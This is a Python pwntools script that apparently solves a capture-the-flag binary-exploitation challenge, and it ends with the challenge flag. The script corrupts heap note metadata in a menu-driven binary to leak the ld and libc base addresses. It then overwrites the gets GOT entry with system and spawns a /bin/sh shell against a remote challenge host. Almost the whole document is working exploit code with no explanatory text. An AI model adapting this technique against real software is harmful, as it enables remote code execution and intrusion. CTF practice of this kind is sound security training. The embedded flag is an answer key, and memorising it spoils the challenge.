#!/usr/bin/env python3
from pwn import *
import ctypes

exe = ELF("./challenge_patched")
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

context.binary = exe
context.log_level = 'debug'

gdbscript="""
b*0x000000000040148E
b*0x00000000004013C9"""

def run():
    if args.LOCAL:
        p = process([exe.path])
        gdb.attach(p, api=True, gdbscript=gdbscript)
    else:
        p = remote("pwn2.cscv.vn", 3333)

    return p

p = run()
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sna = lambda msg, data: p.sendlineafter(msg, str(data).encode())
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sn = lambda data: p.sendline(str(data).encode())
s = lambda data: p.send(data)
ru = lambda msg: p.recvuntil(msg)

def create():
    sla(b"> ", b"1")

def read(idx):
    sla(b"> ", b"2")
    sna(b"Index: ", idx)

def write(idx, data):
    sla(b"> ", b"3")
    sna(b"Index: ", idx)
    sl(data)

puts_got = exe.got['puts']
g_note = exe.symbols['g_note']
printf_got = exe.got['printf']
exit_got = exe.got['exit']

create()
create() 

#leak ld
payload = b"A"*0x20 + p64(0) + p64(0x41) + p32(1) + p32(0) + p64(0x403ff8-0x10)
idx = u32(exe.read(0x403ff8 - 0x10, 4))   # *(uint32_t*)(0x403fe8)
info(f"idx: {hex(idx)}, {idx}")
write(0, payload)
read(idx)
leak = u64(ru(b"\n")[:-1].ljust(8, b"\x00"))
ld.address = leak - 0x152f0
success(f"ld base: {hex(ld.address)}")

#leak libc
puts_got = exe.got['puts']
payload = b"A"*0x20 + p64(0) + p64(0x41) + p32(1) + p32(0) + p64(puts_got-0x10)
addr = ld.address + 0x392e0
idx = addr & 0xffffffff
info(f"idx: {hex(idx)}, {idx}")
write(0, payload)
read(idx)
leak = u64(ru(b"\n")[:-1].ljust(8, b"\x00"))
libc.address = leak - libc.sym['puts']
success(f"libc base: {hex(libc.address)}")

#overwrite gets@got to system
system = libc.symbols['system']
gets_got = exe.got['gets']
payload = b"/bin/sh\x00".ljust(0x20, b"\x00") + p64(0) + p64(0x41) + p32(1) + p32(0) + p64(gets_got-0x10)
addr = libc.symbols['setbuf'] 
info(f"addr: {hex(addr)}")
idx = addr & 0xffffffff
info(f"idx: {hex(idx)}")
write(0, payload)
write(idx, p64(libc.sym['system']))
write(0, b"")

p.interactive()

#CSCV2025{313487590c9dbf64bdd49d7e76980965}